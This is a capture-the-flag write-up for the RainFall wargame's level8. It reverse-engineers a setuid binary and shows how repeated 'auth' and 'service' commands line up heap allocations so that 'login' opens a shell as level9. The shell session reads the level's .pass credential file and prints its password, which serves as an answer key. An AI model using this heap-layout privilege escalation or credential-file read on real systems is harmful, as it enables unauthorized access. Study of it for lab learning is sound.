level8
======

*	We spawn with a [level8](src/level8) executable
	```console
	level8@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
	level8@RainFall:~$ ./level8 
	(nil), (nil) 
	test
	(nil), (nil) 
	test
	```
*	Using ghidra on the program made me sick, this is the [base code](src/level8.c), but I tried to make it more readable for the sake of the correction, here is the [better code](src/level8_better.c). Let's review it :
	-	Infinite loop that takes two inputs `fgets` with a `BUFFER_SIZE=128`
		-	`printf` addresses of `auth` and `service`
		-	`return 0` if wrong input
		-	check for keywords `auth - reset - service - login` with `strncmp`
			-	`auth`:	
				-	`calloc(8)` the `auth[0]`
				-	`strcpy` the content of `tempBuffer` if its less than 30 char length into `auth`
			-	`reset`: `free(auth)`
			-	`service`: `strdup()` the `serviceBuffer` into `service[0]`
			-	`login`:
				-	if `auth != NULL` :
					-	if `auth[8] == 0` prompt to enter a password
					-	else launch a `/bin/sh`
*	To be fair it is quite the disgusting code. The point here is to make it so `auth[8]*4 -> 32nd bytes since its an array of 4 bytes` is equal to `0`.
*	Let's try the program:
	```console
	level8@RainFall:~$ ./level8 
	(nil), (nil) 
	auth 
	0x804a008, (nil) 
	service
	0x804a008, 0x804a018 
	```
	Since We have the address we can see a difference of `0x804a018 - 0x804a008 = 16 bytes`. Which means that adding another service command (remember that it dup again) should get us exactly at `auth[32]`
	```console
	[...]
	service
	0x804a008, 0x804a028 
	```
	So `0x804a028 - 0x804a008 = 0x20 -> 32`. We should be able to use the `login` command and get a shell.
	```
	[...]
	login
	$ whoami
	level9
	$ cat /home/user/level9/.pass  
	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
	```